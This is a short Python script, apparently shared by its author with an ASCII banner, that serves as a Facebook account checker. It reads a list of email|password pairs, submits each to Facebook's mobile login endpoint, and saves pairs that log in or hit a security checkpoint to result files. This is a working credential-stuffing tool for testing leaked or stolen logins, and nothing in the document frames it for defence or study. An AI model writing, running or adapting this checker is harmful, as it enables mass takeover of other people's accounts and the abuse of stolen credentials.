import requests,os


class ceker:
	def __init__(self):
		self.kun=[]
		self.u='https://mbasic.facebook.com/login'
		self.cek()

	def cek(self):
		try:
			os.mkdir('result')
		except: pass
		print("""
		
     ___  ___   _____         _____   _           ___   _____   _   _   
    /   |/   | |  _  \       |  _  \ | |         /   | /  ___| | | / /  
   / /|   /| | | |_| |       | |_| | | |        / /| | | |     | |/ /   
  / / |__/ | | |  _  /       |  _  { | |       / / | | | |     | |\ \   
 / /       | | | | \ \       | |_| | | |___   / /  | | | |___  | | \ \  
/_/        |_| |_|  \_\      |_____/ |_____| /_/   |_| \_____| |_|  \_\ 
 
 (Mahmoud Mohamed) 
 ==================
 fb.me/mr.black.eg0
 ==================
 FB ACCOUNT CHECKER
 ================== 
		""")
		try:
			os.mkdir('result/checker')
		except: pass
		print('email|password')
		fil=input('[?] list accounts: ')
		file=open(fil,'r').read().splitlines()
		for i in file:
			self.kun.append(i)
		print()
		for x in self.kun:
			p=x.split('|')
			id=p[0]
			pas=p[1]
			self.login(id,pas)

	def login(self,id,pas):
		rr=requests.post(self.u,data={'email':id,'pass':pas})
		if 'logout.php' in rr.text or 'mbasic_logout_button' in rr.text:
			print(f'[live] {id}|{pas}')
			f=open('result/live.txt','a')
			f.write(f'{id}|{pas}\n')
			f.close()
		elif 'checkpoint' in rr.text:
			print(f'[checkpoint] {id}|{pas}')
			c=open('result/check.txt','a')
			c.write(f'{id}|{pas}\n')
			c.close()

ceker()
print('\n[saved] result/live.txt')
print('[saved] result/check.txt')
